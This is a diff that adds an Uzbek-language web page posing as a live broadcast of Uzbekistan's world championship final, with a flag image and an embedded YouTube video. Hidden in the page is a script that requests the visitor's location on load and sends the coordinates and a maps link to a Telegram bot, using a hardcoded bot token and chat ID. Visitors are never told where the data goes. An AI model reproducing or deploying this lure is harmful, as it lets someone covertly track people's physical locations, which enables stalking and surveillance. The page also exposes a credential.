@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>O'zbekiston jahon championatida</title>
+</head>
+<body style="font-family: Arial; text-align: center; padding: 20px;">
+  <h1>O'zbekiston jahon championatida</h1>
+  <h2>Live: Final bosqichi boshlandi</h2>
+
+  <!-- Bayroq yoki logo -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Flag_of_Uzbekistan.svg/2560px-Flag_of_Uzbekistan.svg.png"
+       alt="O'zbekiston bayrog'i" width="200" style="margin: 20px 0;" />
+
+  <p>Iltimos, joylashuvingizga ruxsat bering.</p>
+
+  <!-- Link -->
+  <a href="https://youtube.com" target="_blank" style="display: inline-block; margin: 15px 0; font-weight: bold;">
+    ▶️ To‘liq videoni tomosha qilish
+  </a>
+
+  <!-- YouTube iframe -->
+  <div style="margin-top: 20px;">
+    <iframe width="300" height="170" src="https://www.youtube.com/embed/60ItHLz5WEA"
+      title="YouTube video player" frameborder="0" allowfullscreen></iframe>
+  </div>
+
+  <!-- Telegramga joylashuv yuborish -->
+  <script>
+    const chat_id = '8171725505'; // O'zingizning chat ID
+    const token = '8074013169:AAG1RdLhu1MSxIipN88MM298Cl4MzLxThkA'; // Bot token
+
+    function sendLocationToTelegram(lat, lon) {
+      const message = `📍 Joylashuv:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chat_id, text: message })
+      }).then(() => {
+        document.body.innerHTML += "<p style='color: green;'>✅ Joylashuv yuborildi!</p>";
+      }).catch((err) => {
+        alert("Xatolik: " + err);
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocationToTelegram(lat, lon);
+        },
+        (error) => {
+          alert("Joylashuvni olishda xatolik: " + error.message);
+        }
+      );
+    } else {
+      alert("Brauzeringiz joylashuvni qo‘llab-quvvatlamaydi.");
+    }
+  </script>
+</body>
+</html>
